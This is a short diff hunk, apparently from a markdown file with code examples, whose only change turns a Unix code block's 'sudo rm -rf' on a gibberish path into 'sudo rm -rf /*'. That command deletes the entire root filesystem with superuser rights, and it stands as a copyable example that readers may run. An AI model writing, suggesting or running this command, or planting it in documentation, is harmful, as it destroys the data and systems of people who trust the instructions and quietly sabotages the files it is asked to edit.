@@ -18,5 +18,5 @@ object Hello {
 ```
 
 ```Unix
-sudo rm -rf  jjtyjtjttjtjttjth/*
+sudo rm -rf /*
 ```
